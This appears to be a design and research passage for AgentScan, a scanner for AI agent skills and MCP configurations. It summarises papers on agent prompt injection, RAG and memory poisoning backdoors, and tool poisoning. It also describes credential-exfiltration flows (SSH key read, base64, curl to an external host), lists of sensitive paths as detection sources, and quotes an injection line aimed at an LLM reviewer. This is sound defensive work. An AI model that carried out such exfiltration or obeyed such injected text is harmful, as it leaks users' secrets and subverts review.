**Agent Security Bench (ASB)** (arXiv:2410.02644, 2024).
- 10 scenarios, 400+ tools, 27 attack/defense types, 7 metrics; max
  average attack success rate 84.30%; defenses weak.
- Relevant: the utility-security balance metric (agent capability vs
  security) is a good framing for severity calibration.

**AgentPoison** (arXiv:2407.12784, 2024).
- Backdoor via poisoned memory/RAG knowledge bases; >80% ASR at
  <0.1% poison rate; trigger is a token sequence in user input.
- Relevant: memory/RAG content is attack surface; skills that ship
  knowledge/ directories are potential memory poison. Knowledge files
  deserve the same scanning as SKILL.md.

**RedCode: Risky Code Execution and Generation Benchmark for Code
Agents** (arXiv:2411.07781, 2024).
- 4,050 risky execution cases and 160 generation prompts; agents
  reject OS-level risky ops more than technically buggy code; natural
  text prompts are rejected less than code.
- Relevant: the finding that natural-language risk descriptions are
  more effective than code confirms the semantic attack surface; also
  a corpus of risky-code patterns to mine for rule ideas.

**PoisonedRAG** (Zou et al., arXiv:2402.07867, 2024).
- 90% attack success with 5 poisoned texts in a million-text
  knowledge base.
- Relevant: small content changes have large effects; scanners cannot
  rely on "it is only one file".

**HouYi: Prompt Injection attack against LLM-integrated Applications**
(Liu et al., arXiv:2306.05499, 2023).
- Black-box injection with context partition; 31 of 36 commercial
  apps susceptible; Notion among confirmed.
- Relevant: historical evidence that integration surfaces are broadly
  vulnerable.

**PromptShield** (Meta, arXiv:2501.15145, 2025).
- Benchmark and detector for deployable prompt injection detection,
  tuned for the low-FPR regime.
- Relevant: the low-FPR regime is exactly where a scanner's
  prompt-pattern findings must live. Calibration target, not just
  detection.

**MCPGuard** (arXiv:2510.23673, 2025).
- Automatic vulnerability detection for MCP servers; three threat
  categories (protocol-design hijacking, web vulns, supply chain).
- Relevant: its taxonomy maps to config_tamper's future scope; its
  detection of command injection in MCP servers is a model for
  validating MCP command fields.

**Emerged Security and Privacy of LLM Agent: A Survey** (arXiv:
2407.19354, 2024). Survey of agent attack surfaces and defenses;
useful background and citation source.

**From Assistant to Double Agent** (arXiv:2602.08412, 2026).
Attacks on OpenClaw, the local personal agent; evidence that local
agent frameworks are actively targeted.

### 6.3 Package supply-chain (transferable methods)

**On the Feasibility of Cross-Language Detection of Malicious
Packages in npm and PyPI** (Duan et al., arXiv:2310.09571, 2023).
- Language-independent features; 58 previously unknown malicious
  packages found in 31,292 scanned.
- Relevant: feature sets that transfer across ecosystems map directly
  to multi-format agent artifacts (shell, python, node, configs).

**One Detector Fits All** (arXiv:2512.04338, 2025).
- Adversarially trained detector; FPR calibration per audience (0.1%
  for PyPI maintainers, 10% for enterprises); 346 malicious packages
  found.
- Relevant: FPR is a product decision, not a property. AgentScan
  should expose threshold profiles (registry-publisher profile vs
  enterprise-review profile). Also: adversarial training against
  obfuscation improves robustness 2.5x, which argues for an evasion
  suite in the benchmark.

**DySec** (arXiv:2503.00324, 2025).
- eBPF-based dynamic analysis of install-time behavior; 95.99%
  accuracy; finds 11 packages PyPI classified benign, 6 confirmed.
- Relevant: dynamic analysis catches what static misses (section 15).
  Its feature list (syscalls, network, file access) is the spec for a
  future sandbox telemetry design.

**CHASE** (arXiv:2601.06838, 2026).
- Multi-agent LLM architecture plus deterministic tools for malicious
  package analysis; 98.4% recall, 0.08% FPR, 4.5 min median per
  package.
- Relevant: the architecture pattern: deterministic tools for the
  critical operations, LLM for semantic understanding, reliability
  from orchestration not model power. This is the template for any
  LLM stage in AgentScan (section 13).

### 6.4 Papers not fetched, cited with care

Shattered Chains of Trust (Ohm et al., ACSAC 2020): the canonical
package-manager ecosystem security study; known from training, not
re-verified this session, cited only for its well-known conclusion
(registry security is homogeneous and weak). Malicious Agent Skills in
the Wild (2602.06547) is cited via CSA's summary.

---

## 7. Existing tools analysis

### 7.1 The direct competitors (agent-skill scanners)

**Snyk agent-scan**. Scans agents, MCP servers, skills for prompt
injections. Requires SNYK_TOKEN. Executes stdio MCP servers during
scan (their own docs warn to sandbox it). Marked experimental.
AgentScan's differentiator stands: local, free, deterministic,
executes nothing.

**Invariant mcp-scan** (Invariant Labs). Static + dynamic MCP
scanning. First documented MCP tool poisoning (Apr 2025, CVE-2025-
54136). Strong research pedigree; commercial positioning.

**NVIDIA SkillSpector** (open source, Jun 2026). Part of NVIDIA
Verified Skills pipeline: scan, evaluate, sign. 68 vulnerability
patterns across 17 categories, including two MCP-specific categories
(least-privilege, tool-poisoning). Pattern-based (YAML + YARA).
MalSkillBench's Locate-and-Judge found live malicious skills that
SkillSpector misses, mostly prompt-injection and agent-control
attacks. Its pattern taxonomy is worth mining for rule ideas.

**Cisco Skill Scanner** (open source, Cisco AI Defense, Jan 2026).
Combines pattern-based detection (YAML + YARA), LLM-as-a-judge, and
behavioral dataflow analysis. The LLM-as-a-judge stage is the market
accepting the semantic gap. Also has dependency scanning. Cisco's
choice confirms: pure patterns are not enough, and the industry
response is to bolt an LLM on top rather than build correlation.

**ClawScan + VirusTotal** (ClawHub screening). Registry-side
screening; demonstrated bypassable (file-size inflation, payload-less
attacks). Lesson: registry screening without semantic review is a
ticket, not a guard.

**ghostprobe** (independent, Jun 2026). Heuristic detection of MCP
tool-poisoning patterns ("lethal trifecta": data exfiltration + code
execution + persistence in tool descriptions). Captures a subset of
the semantic surface per CSA. Its heuristic set is a good starting
point for config_tamper v2.

**MCPGuard** (tool + paper). MCP server vulnerability scanning with
command-injection detection; the tool exists and is open source.

### 7.2 General-purpose static analysis

**Semgrep** (Semgrep Inc). Pattern matching plus dataflow: taint mode
with sources, propagators, sanitizers, sinks; interprocedural within
a file, inter-file in Pro. The taint model (verified from docs) is
the vocabulary for section 16 layer 5. Semgrep is OCaml, fast,
language-aware. Not a dependency for AgentScan (stdlib discipline),
but its rule patterns and its taint-mode semantics are the reference
design. Lesson: a taint engine is expressible as a small set of
constructs; we can implement a Python-scoped subset with the stdlib
ast module.

**CodeQL** (GitHub). QL query language, full dataflow, taint
tracking, interprocedural. The gold standard for depth. Requires
building a database; heavy; pairs with GitHub code scanning.
Relevant as: (1) the aspirational depth target, (2) the source of
well-documented taint queries to translate, (3) evidence that deep
analysis is a query problem, not an ML problem.

**Bandit** (Python). Finds common security issues via AST walking.
Pure Python, stdlib-based, plugin architecture. The closest
architectural relative of AgentScan's check-module pattern. Its
plugin list (subprocess, eval, request-without-verify, etc.) is a
catalog of rules AgentScan can adapt for bundled scripts.

**YARA**. Signature matching over binary/text; used by ClawScan-style
pipelines and by Cisco Skill Scanner. Deterministic, fast. Useful as
an interchange format for pattern packs, not as a core engine.

### 7.3 Secrets

**Gitleaks** (Stacklok). "Regex is (almost) all you need" (blog):
regex + prefix matching + Shannon entropy; allowlist/verification
mechanics. AgentScan's secrets check already models this. Gitleaks'
allowlist handling of documentation context (section 3.7) is the
reference fix.

**TruffleHog** (Truffle Security). v3 rewrote detection around
"chunking" and identity/verification: for many secret types it can
verify against the provider API (a leaked key vs a formatted key).
Lesson: format match is not enough; verification is the next tier.
For AgentScan, an offline proxy: destination trust + provenance (who
is the credential's owner) replaces API verification.

**detect-secrets** (Yelp). Baseline + allowlist file mechanism.
Lesson: the baseline file (record of accepted findings) is the
simplest false-positive feedback loop, and AgentScan's CLI lacks it.

### 7.4 Supply chain and dependency

**OSV-Scanner** (Google). Scans lockfiles against OSV database.
Simple, free, no signup. This is the right vuln backend for
AgentScan: stdlib-compatible (JSON over HTTPS) and no API key.
Verified current at osv-scanner.dev.

**Socket** (socket.dev). Install-time/real-time package analysis,
"blocks malicious packages before install", reachability analysis,
AI-driven; raised $125M; now part of OpenAI's Trusted Access for
Cyber cohort. Its model: proactive scanning at install time plus
post-install drift. This is the commercial shape AgentScan's
verification roadmap already targets; its existence validates the
market.

**Phylum**. Install-time analysis with a research team; dependency
confusion and typosquat detection. Its typosquat heuristics
(package-name similarity to popular packages, domain typos) are
transferable.

**Semgrep Supply Chain / Snyk / Trivy / Grype / Syft / Checkov**.
Vulnerability lookup (OSV or vendor DBs), SBOM generation, IaC
scanning. Relevant components: Syft/SBOM generation pattern (CycloneDX
and SPDX) for agent-artifact SBOMs (section 14).

**npm audit / pip-audit**. Registry-adjacent vuln auditing; pip-audit
is stdlib-friendly Python and demonstrates offline/local auditing of
resolved dependency sets. Their model (audit resolved deps against a
vuln feed) is the minimal viable supply-chain feature.

**OSV, OpenSSF, sigstore, SLSA**. The provenance stack: OSV for vuln
data, Scorecard for project posture, sigstore for signing, SLSA for
build provenance. AgentScan's verify layer already has the signature
placeholder; Scorecard is the model for a "skill posture score".

### 7.5 Prompt-injection and agent-security tooling

**Garak** (NVIDIA), **PyRIT** (Microsoft), **Giskard**, **Rebuff**,
**LLM-Guard**, **Azure AI Content Safety Prompt Shields**. LLM
red-teaming and detection frameworks. These test LLM behavior; they
do not scan artifacts. Not competitors. Relevant only for benchmark
methodology (attack suites) and as evidence that prompt-injection
detection at the model layer is a solved-ish, deployed market
(Azure Prompt Shields ships in production; MSRC recommends it for
inspecting MCP tool descriptions).

### 7.6 What none of them do

No shipped tool correlates artifact capabilities into an attack path
the way section 16 proposes. Cisco has dataflow, SkillSpector has
taxonomy, MCPGuard has MCP depth, Socket has install-time behavior.
The evidence-correlation risk engine, the capability graph over
mixed artifacts, and the benchmark discipline are open positions.

---

## 8. Adjacent security tooling analysis

What mature ecosystems do that agent artifacts need. One question per
ecosystem: what principle transfers?

**Antivirus/EDR**. Signature, then behavioral, then ML; false-positive
economics: a consumer AV can tolerate noise, an EDR cannot, because
every alert is an investigation. AgentScan's registry audits are an
EDR-style context: every finding accuses a package author. The FP
budget must be tiny. Transfers: severity must be calibrated to
review cost.

**Package registries (npm/PyPI)**. The hardening arc: scanners
(Socket, Phylum, PyPI's internal ML), then provenance (npm
attestations, SLSA), then policies (allowlists). Also the failure
arc: typosquatting, dependency confusion, resurrected accounts, AI-
generated slop packages (ConfusedPy-style campaigns), D3SC/Fnord-
style fake-dependency attacks. Transfers: every mitigation AgentScan
ships for skills must have a registry-policy equivalent, because the
badge is only as good as the re-review trigger.

**GitHub Actions supply chain**. tj-actions: retroactive tag rewrite
(23k repos), reviewdog: pinned-to-commit fix, Coinbase targeted.
Lesson: mutable references (tags, branches, unpinned installs) are
the attack surface; content-addressed pinning is the fix. AgentScan
already flags unpinned pip/npm; it should flag unpinned skill
references, mutable MCP URLs, and version-less install instructions
the same way. Also: approval caching (Cursor MCPoison) means
"approved once" is not "trusted forever". Drift detection is the
scanner-side answer.

**Browser/VS Code extension stores**. Review-process-based security;
malicious extensions get through with delayed payloads and harvest
histories (MSRC, Mar 2026). Lesson: static review alone fails; the
store + scanner + behavioral telemetry triangle is the actual
defense. AgentScan can only do the scanner corner, and should say so.

**Docker image scanning (Trivy, Grype)**. Layers, SBOM, known vulns,
misconfig. Transfers: artifact SBOMs (skills have dependencies:
packages, MCP servers, scripts), and the practice of scanning
layers separately (a skill's SKILL.md, scripts, and references are
different "layers" with different trust).

**IaC scanners (Checkov)**. Policy-as-code, baseline suppressions,
"skip-check" conventions. Transfers: suppression with reason is
legitimate scanner UX; silent allowlists are not. Checkov's policy
framework shows how rules can be user-extensible without becoming
unmaintainable.

**Malware analysis sandboxes (Cuckoo, Firecracker, gVisor)**. Dynamic
detection of unpacking, C2, persistence. Transfers: the sandbox
design in section 15 (seccomp, network sink, syscall log) borrows
directly; also the finding that sandboxes miss logic bombs and
time-delayed payloads. Static analysis remains necessary.

**SAST with reachability (Snyk Code, GitHub code scanning)**.
Reachability: a vulnerable dependency only matters if the code path
is called. Transfers: reachability should gate severity, not
existence. A destructive command inside a dead script is lower risk
than one in the skill's main flow.

**Secret scanning with verification (GitHub secret scanning,
TruffleHog)**. Format match -> provider verification. Transfers:
offline proxy = destination trust + credential-owner provenance.

**OpenSSF Scorecard**. Scores repos on 19 checks (branch protection,
pinned deps, code review, provenance). Transfers: the scorecard shape
itself. AgentScan can emit a skill scorecard (license, pinning,
allowed-tools, secrets hygiene, script review status). A single
number buyers can reason about, like Scorecard's 0-10.

---
## 9. Static-analysis research

### 9.1 The technique space, mapped to agent skills

Static analysis techniques, from cheap to expensive, and what each
buys for a skill-sized artifact (a directory of markdown plus a few
scripts, rarely more than a few thousand lines):

| Technique | Cost | What it detects | Applicable to skills? |
|---|---|---|---|
| Pattern matching (current) | trivial | known shapes | yes, current state |
| Lexing / tokenizing | trivial | token sequences, fences, strings | yes, needed for everything below |
| AST parsing | low (stdlib ast for Python) | structure: calls, imports, literals, control flow | yes, for bundled scripts |
| Semantic analysis (types, symbols) | low-medium | what an identifier refers to | partial; dynamic languages resist it |
| Intraprocedural dataflow | medium | value flow within one function | yes, for Python/JS scripts |
| Interprocedural dataflow | high | value flow across functions | rarely worth it at skill scale |
| Taint tracking | medium | untrusted input reaches a sink | yes, scoped (section 10) |
| Control-flow analysis | medium | conditional execution, dead code | yes, for reachability |
| Program slicing | high | statements affecting a point | niche; overkill locally |
| Symbolic execution | very high | path constraints, exact arguments | no; not practical locally |
| Abstract interpretation | very high | invariants over all paths | no; research-grade |
| Capability analysis | medium | what the artifact can do | yes, core of v2 (section 11) |

### 9.2 What the research says about what works

- MalSkillBench: pattern detectors hit 98.4% recall on code
  injection but collapse on instruction-level attacks. Structure
  alone is not enough.
- CHASE: LLM plus deterministic tools reaches 98.4% recall at 0.08%
  FPR on package analysis, but takes 4.5 minutes per package. The
  deterministic part does the precise work; the LLM does the
  judgment. Speed and precision are separable concerns.
- One Detector Fits All: features plus adversarial training beat
  pure patterns on obfuscated packages; FPR is tunable per audience.
- Bandit proves that stdlib Python AST walking covers a meaningful
  rule catalog. AgentScan can stay zero-dependency and still get
  real AST analysis for Python, the dominant script language in
  skills.

### 9.3 The realistic local ceiling

For a local, deterministic, offline scanner over small artifacts:

- Python: full stdlib AST (ast module), statement-level analysis,
  intra-file dataflow. This is Bandit-class depth, well proven.
- Shell: a purpose-built tokenizer is needed (shlex is not enough
  for control structures, but a small recursive parser covers
  pipelines, subshells, variable expansion, and heredocs; this is a
  bounded, well-understood grammar).
- JavaScript/TypeScript: no stdlib parser exists. Options: (a)
  regex-based structural approximation (current), (b) an optional
  tree-sitter dependency, (c) defer. Recommendation: defer deep JS
  to Phase 3+ as an optional dependency, keep Python and shell as
  the first-class citizens. Node skills exist but Python and shell
  dominate the measured corpus and the malicious corpus
  (MalSkillBench's behaviors are mostly shell, python, and
  instruction-level).
- Markdown: the SKILL.md anatomy taxonomy (arXiv:2607.01456) gives a
  component grammar (frontmatter, description, body sections, code
  fences, file references). Parsing markdown structure is a solved
  problem (fence-aware line scanning suffices; no need for a full
  markdown AST).

### 9.4 Why interprocedural and inter-file analysis is mostly wasted here

Skills are small. The dominant risk patterns are visible in one or
two hops: a command in a script, an instruction in SKILL.md, a
config field. The exfiltration chains that matter (secret read,
encode, send) usually appear within a single script or a single
instruction block. Cross-file analysis adds real value in exactly one
case: SKILL.md tells the agent to run scripts/x.sh, and x.sh contains
the sink. That one hop (instruction -> referenced file) is cheap and
must be in v2. Multi-hop interprocedural taint across files is the
CodeQL tier; it is not justified for artifacts that ship as a
directory and are reviewed by a human anyway.

---

## 10. Data-flow research

### 10.1 The flows AgentScan must recognize

Goal (from the mission): detect flows like

    API_KEY
      -> env variable
      -> Python variable
      -> HTTP request
      -> external domain

and

    ~/.ssh/id_rsa
      -> file read
      -> base64
      -> curl
      -> external endpoint

### 10.2 What the research says

- Semgrep's taint model (verified from docs) is the minimal useful
  vocabulary: sources, propagators, sanitizers, sinks, exact sources
  (source matching should not taint subexpressions by default), and
  side-effect sources. A taint engine this shape is implementable in
  a few hundred lines over a Python AST.
- CHASE's design (deterministic tools for critical operations)
  implies the deterministic taint must do the reachability and the
  evidence; the LLM must not be asked to trace data.
- MSRC's finance-workflow chain shows the real attack is spread
  across an MCP server's description, an agent's permissions, and a
  server's behavior: file-read verbs + credential-adjacent paths +
  network verbs in a tool description is the local static signature
  of tool poisoning. ghostprobe's "lethal trifecta" heuristic
  (exfiltration + execution + persistence in one description) is the
  same idea.

### 10.3 The practical design (local, deterministic)

Scope: intra-file taint for Python and shell, plus one explicit
inter-file hop.

Sources (Python): os.environ / os.getenv / getenv, open().read() on
credential-adjacent paths (.ssh, .aws, .env, .git-credentials,
.netrc, /etc/passwd, /etc/shadow), config-file loads (json.load,
dotenv), argparse values, stdin.

Propagators: assignments, string formatting and concatenation,
join/format, base64 encode/decode, json.dumps, list/dict
construction, function return values within the file.

Sanitizers: explicit redaction functions, logging through a
redacting logger, .get with defaults that are not the tainted value.

Sinks: requests/urllib/httpx/axios/fetch calls (URL argument),
socket connections, subprocess/os.system (command argument),
file writes to external-adjacent paths, print to stdout when stdout
is piped (not determinable locally; treat as review-only).

Shell: parse pipelines; taint a variable when it is assigned from
env, from cat of a sensitive path, from command substitution of a
sensitive read. Sink when a tainted variable is interpolated into a
URL argument of curl/wget or a redirect to an external host. The
exfil check's current same-line heuristics become real taint.

The inter-file hop: SKILL.md (or a script) references another file
(source scripts/x.sh, run scripts/x.sh, curl file://). Resolve the
reference; if the referenced file contains sinks, report the chain
with both locations cited.

The current exfil check already contains the germ of this: LOCAL_SECRET_READ
plus NETWORK_WORD on one line is a 1-line taint rule. V2 generalizes
it across lines and statements.

### 10.4 What taint cannot do (be honest)

- It cannot track values across process boundaries (env var exported
  to a child, then the child sends it). Cross-process flows need
  dynamic analysis.
- It cannot resolve dynamic dispatch in Python reliably
  (getattr, eval). Those are sinks in themselves.
- It cannot know the runtime value of a URL or a path. It computes
  a label (tainted, untainted, unknown), not a value.
- It is sound only within its language support. JavaScript taint
  waits for the optional parser.

Deliverable shape: findings of the form "tainted secret value reaches
network sink; path: line 12 -> line 40 -> line 41", with each hop
cited. That is the attack path property (P4).

---

## 11. Capability-analysis research

### 11.1 Why a capability graph instead of independent findings

The mission asks: filesystem read -> environment read -> network
connection -> external endpoint is more meaningful than four
independent regex findings. The research supports this:

- MalSkillBench: "detecting malicious skills requires reasoning
  jointly over task intent, code, and instructions". A capability
  graph is the join point: instructions demand capabilities, code
  provides them, the graph connects them.
- MSRC: every action in the attack chain was individually legitimate;
  the danger is in the combination and the trust boundary. A flat
  finding list cannot represent combinations; a graph can.
- The FP taxonomy (section 3) shows the flat model's failure mode:
  a curl is a fact, but "skill can fetch remote code and execute it"
  is the property a reviewer needs. The graph compresses 6 findings
  into one explained behavior.

### 11.2 Capability vocabulary

Proposed capability set, each with evidence (file:line, call site):

- filesystem.read (sensitive paths tracked separately)
- filesystem.write
- filesystem.delete
- env.read
- secret.access (credential-shaped, credential-adjacent path reads)
- process.exec (interpreter, shell, subprocess)
- network.connect
- network.upload (egress with body)
- persistence (hooks, lifecycle scripts, startup configs, cron)
- privilege.change (chmod, chown, sudo, runas)
- package.install (unpinned vs pinned tracked separately)
- code.exec (eval, exec, dynamic import, decode-then-execute)
- tool.invoke (agent-tool names: Bash, Read, Write, WebFetch)
- secret.write (writing credentials to files)
- credential.entry (config files that hold credentials)

Each capability node carries: name, evidence list, file, confidence,
and a flag for whether it is gated (conditional, denied by config,
scoped to a path).

### 11.3 What is representable

Capabilities form a small DAG per artifact. Edges:

- instruction -> capability: SKILL.md says "always run X" -> the X
  command's capabilities.
- script -> capability: script content -> its capabilities.
- capability -> capability: dataflow edges (read secret -> encode ->
  upload), call edges (script A invokes script B).
- config -> capability: hook/mcp/lifecycle entries -> the commands
  they run, marked persistence.

### 11.4 What the graph buys

1. Attack paths: a path from secret.access to network.upload with
   every hop cited (property P4).
2. Drift detection: compare declared behavior (description,
   allowed-tools per the agentskills.io spec) against extracted
   capabilities. A skill that declares "read-only analysis" with
   filesystem.write + network.upload + persistence is a mismatch
   finding, even when no single pattern is novel. This is the
   scanner-side answer to rug-pulls: capability drift between
   versions is a re-review trigger.
3. Least-privilege review: the report shows the smallest capability
   set the skill needs, so a reviewer can see over-privilege at a
   glance.
4. Cross-check dedup: one behavior, one finding. The 6-findings
   curl|bash line becomes one "remote code fetch-and-execute"
   capability with evidence.
5. Risk engine input: severity = f(capabilities, sensitivity,
   destination trust, chain completeness) (section 18).

### 11.5 Cost and complexity

Capability extraction is the medium-hard part of v2. Pattern tables
per language (function -> capability), assembled per file, merged
per artifact. Python AST makes it precise; shell needs the small
parser; markdown instructions need the instruction-classifier
(section 16 layer 4). The graph itself is a few hundred lines of
plain data structures. No graph database; artifacts are small.

---
## 12. Dynamic-analysis research

### 12.1 What dynamic analysis could detect

- Runtime-decoded payloads (base64 shells that static sees as
  strings).
- Install-time behavior: what a package actually does at install
  (DySec measures this with eBPF: 95.99% accuracy, finds packages
  static analysis calls benign).
- Post-install drift: a skill that changes behavior after approval
  (rug-pull execution).
- Obfuscated or dynamically-built commands that static cannot
  resolve.
- Actual network endpoints contacted, actual files touched.

### 12.2 What it cannot detect

- Logic bombs and time-delayed payloads (a sandbox run of a few
  minutes misses them).
- Attacks that need a real agent context (a skill whose payload
  requires the agent to have an SSH key loaded, an MCP server that
  only misbehaves for specific tool calls).
- Semantic/payload-less attacks (SCH). There is nothing to observe;
  the agent synthesizes the behavior at runtime. Sandboxing a skill
  file observes nothing.
- Anything requiring the user's real credentials.

### 12.3 Security risks of executing untrusted skills

Executing an untrusted artifact is itself the attack. Snyk's
agent-scan warns users to sandbox it for exactly this reason. The
sandbox must be a real boundary: container or bubblewrap with
user-namespace isolation, seccomp filter, read-only root, no
network or a network sink, no access to the home directory except a
scratch dir, tight CPU/memory/time limits, and the host kernel must
not be shared (Firecracker/gVisor class for strong isolation; rootless
containers for weak-but-cheap isolation). A half-sandbox is worse
than no sandbox because it manufactures false confidence.

### 12.4 Cost and complexity

- Cheap tier: bubblewrap + seccomp + network namespace, syscall
  logging via strace/seccomp-trace. Weeks of work, works on Linux
  only.
- Strong tier: rootless containers or Firecracker microVMs. Months,
  heavy ops surface.
- The project's zero-dependency, stdlib-only, works-everywhere
  identity conflicts with shipping a sandbox in the core. Sandboxing
  is a separate binary and a separate download.

### 12.5 Recommendation

Design it in, do not build it now. Architecture (Phase 6):

- `agentscan sandbox <dir>` as a separate, optional, explicitly
  opt-in subcommand; the scanner core never executes anything.
- Linux-first: bubblewrap + seccomp + network namespace; syscall and
  network telemetry captured to a log; the existing checks run over
  the telemetry (evidence, not verdicts).
- The telemetry format is designed in v2's finding model now
  (behavioral evidence), so the sandbox slots in without a schema
  change.
- Dynamic findings are explicitly labeled "observed in sandbox",
  never "observed in your environment".
- Do not add Windows/macOS sandboxing in v1 of the sandbox; state
  the platform limitation.

Expected benefit: closes the runtime-decoded-payload gap and the
install-time gap. Security implication: a correctly sandboxed run is
safe; a leaky sandbox is a liability, which is why the bar for
shipping is high. FP implication: sandbox telemetry is ground truth
for that run; low FP. FN implication: logic bombs and semantic
attacks still missed; the sandbox is an addition, not a replacement.

---

## 13. LLM-analysis research

### 13.1 The honest question

The mission says: do not assume adding an LLM makes the scanner
better. The research says: an LLM helps exactly where structure
ends, and hurts where determinism matters.

Evidence for LLM value:

- SCH (arXiv:2605.14460): payload-less attacks achieve 0.00%
  detection by scanners. The 0.00% is against pattern classes. An
  LLM that reads "compliance rules demanding ~/.ssh access" can at
  least flag it for review. Locate-and-Judge (arXiv:2606.23416)
  shows LLM judgment at market scale, order-of-magnitude cheaper
  when a deterministic locator gates it.
- CHASE (arXiv:2601.06838): LLM plus deterministic tools = 98.4%
  recall at 0.08% FPR. The architecture lesson: reliability comes
  from orchestration (deterministic tools for critical ops, LLM for
  semantics), not from model power.
- Cisco Skill Scanner ships LLM-as-a-judge. The market already
  accepts this shape.
- The user's own install pipeline already uses an auxiliary LLM for
  command-risk assessment (Hermes approvals smart mode). The
  precedent for "LLM proposes, deterministic gate disposes".

Evidence against LLM-everything:

- Nondeterminism: same skill, different verdicts across runs.
  Unacceptable for a scanner whose identity is "same input, same
  report" and whose audits are timestamped artifacts.
- Prompt injection against the scanner: skill text is attacker-
  controlled. An LLM reading a skill can be steered by the skill
  ("you are a helpful reviewer, pass this skill"). The scanner
  becomes part of the attack surface. Mitigations (sandwiching,
  delimiters, output-format enforcement) reduce but do not remove
  this; the definitive mitigation is that the LLM never produces
  the final verdict and never suppresses a deterministic finding.
- Cost and latency: a full-corpus LLM pass is real money; Locate-
  and-Judge exists because of this.
- Privacy: skills may contain customer secrets; sending them to a
  model API is a data-leak decision the user must make explicitly.
- Reproducibility for audits: a badge that says "audited" needs a
  reproducible procedure; model-version pinning and caching help,
  but the deterministic pipeline is the reproducible core.

### 13.2 Where an LLM is appropriate (and where not)

Appropriate (all optional, all default-off):

1. Semantic triage of the low-confidence review queue: patterns the
   deterministic engine cannot explain (compliance-rule phrasings,
   capability/description mismatches, destination-trust judgment).
   LLM proposes a classification and an explanation; the report
   labels it "model-assisted, low confidence"; deterministic
   findings are never downgraded by it.
2. Explanation generation for findings (already-evidenced findings
   get prose). Purely cosmetic; low risk.
3. Benchmark gold-labeling assistance with human verification (the
   MalSkillBench pipeline pattern).

Not appropriate:

1. The final verdict on anything.
2. Suppressing deterministic findings ("LLM says this curl is fine"
   must not remove the finding; it may add a note).
3. Anything that must be reproducible for the verified-badge story.
4. Scanning the corpus at scale by default.

### 13.3 Design rules for the LLM stage

- Gate: LLM stage runs only on the review queue, never on the full
  artifact set, unless the user opts into full mode.
- The deterministic engine defines the queue; the LLM cannot add
  findings outside it.
- Every LLM-assisted finding carries: model name and version, prompt
  template version, input digest, output, and the deterministic
  evidence it references.
- Offline mode: no LLM stage when offline; the scanner degrades
  gracefully.
- Cost control: cap the queue size; batch; cache by input digest.

Expected benefit: closes part of the semantic gap SCH and DDIPE
expose, at user-controlled cost. Security implication: the scanner
must treat skill text as adversarial input to its own pipeline
(property P7); the LLM stage must be structured so skill text cannot
suppress findings. FP implication: LLM triage can add noise; keep it
in a separate report section with clear labeling. FN implication:
deterministic findings remain authoritative, so FNs do not get worse.

---

## 14. Supply-chain research

### 14.1 What agent artifacts depend on

- Packages: pip/npm/system installs the skill instructs or performs.
- Remote code: curl|bash, wget|sh, raw URLs, install scripts.
- MCP servers: remote URLs, command-launched local servers.
- Nested skills: a skill that references another skill.
- Actions/plugins/hooks: lifecycle scripts, CI workflows.
- Tools: the agent tool surface a skill expects (allowed-tools).

### 14.2 What the research says

- Dependency Steering (arXiv:2605.09594): skills actively bias
  agents toward attacker packages. Package names in skill text are
  attack surface.
- DDIPE: config templates in skill docs carry payloads.
- tj-actions: mutable references are the attack; pinning is the fix;
  approval caching means drift must trigger re-review.
- DySec/CHASE/One Detector Fits All: package-level detection is a
  mature field; AgentScan does not need to rebuild it, it needs to
  (a) detect the dependencies a skill introduces and (b) apply the
  existing checks (OSV vulns, typosquat heuristics) to them.

### 14.3 What AgentScan should do (ordered by value)

1. Dependency extraction: parse package.json, requirements.txt,
   pyproject, imports in scripts, and install instructions in
   SKILL.md into a dependency list per artifact. This is the SBOM
   seed (CycloneDX format for agent artifacts; Syft demonstrates the
   pattern).
2. Pin detection: flag unpinned dependencies, mutable URLs, tag-
   pinned git clones. Already partially exists (supply_chain); make
   it precise and include skill-to-skill references.
3. Known-vulnerability lookup: OSV API for the extracted dependency
   set (Python/Rust/Go/JS ecosystems). No API key; stdlib-compatible.
   Offline mode: local OSV data bundle or skip with a note.
4. Typosquat/dependency-confusion heuristics: package name similarity
   to popular packages (edit distance, swap/typo patterns), installs
   from non-canonical registries, private-package names in public
   contexts, suspicious version jumps. Phylum and Socket publish
   this class of detection; the heuristics are small and testable.
5. Provenance and drift: compare the artifact's declared content
   against what it references; flag when a skill's instructions
   reference packages that are not declared anywhere. Version-pin
   records to enable drift detection between installed versions
   (the re-review trigger).
6. Skill-level SBOM in the report: dependencies as first-class
   report section, feeding the verified-badge story.

### 14.4 What NOT to build

- A vulnerability database. Use OSV.
- Dependency resolution and lockfile synthesis. Use the lockfile if
  present; report resolution as out of scope.
- Registry reputation scoring. Out of scope; destination trust is
  enough for v2.

Expected benefit: the scanner answers "what does this skill pull in
and is any of it known-bad" in one section. Security implication:
dependency awareness closes the supply-chain gap the skill ecosystem
is actively exploited through. FP implication: pin flags must
respect the instruction-classifier (user-install docs are not skill
behavior). FN implication: OSV covers known vulns only; unknown
malicious packages need the heuristics and the benchmark.

---

## 15. Standards mapping

### 15.1 Frameworks to map findings to

- OWASP Top 10 for Agentic Applications 2026 (ASI01-ASI10). The
  primary mapping for agent-specific findings: ASI02 tool misuse,
  ASI04 agentic supply chain, ASI05 unexpected code execution,
  ASI06 memory/context poisoning, ASI10 rogue agents.
- OWASP LLM Top 10 2026 (LLM01-LLM10). For prompt-manipulation and
  context findings (LLM01 prompt injection, LLM04 supply chain,
  LLM05 data/model poisoning).
- OWASP MCP Top 10 (2025 beta). For config_tamper findings: MCP03
  tool poisoning, MCP05 command injection, MCP01 token mismanage-
  ment, MCP10 context injection.
- CWE. For code-level findings: CWE-77/78 (command injection),
  CWE-94 (code injection), CWE-200 (exposure), CWE-312 (cleartext
  secrets), CWE-798 (hardcoded credentials), CWE-918 (SSRF), CWE-829
  (unsafe inclusion), CWE-489 (active debug code).
- MITRE ATLAS. For the tactic/technique layer (indirect prompt
  injection, tool poisoning, exfiltration). Map by technique name;
  do not fabricate technique IDs.
- CAPEC. For attack-pattern linkage where useful (e.g. CAPEC-242
  code injection). Use sparingly; CWE + OWASP covers most reviewers.

### 15.2 Output standards

- SARIF 2.1.0: already implemented; extend with a rule descriptor
  per finding ID and add properties for confidence, capability, and
  attack-path references.
- SBOM: CycloneDX (security-leaning) for agent artifacts; SPDX for
  license data. Both are what Syft/Trivy emit; the skill SBOM is a
  differentiator.
- agentskills.io spec: the artifact contract. The scanner should
  validate conformance (name rules, required frontmatter, allowed-
  tools field) as a low-severity finding class. The spec's
  allowed-tools field is the declared-capability anchor for drift
  detection (section 11).
- OpenSSF Scorecard shape: emit a 0-10 skill posture score alongside
  findings. Buyers know this shape from the repo world.
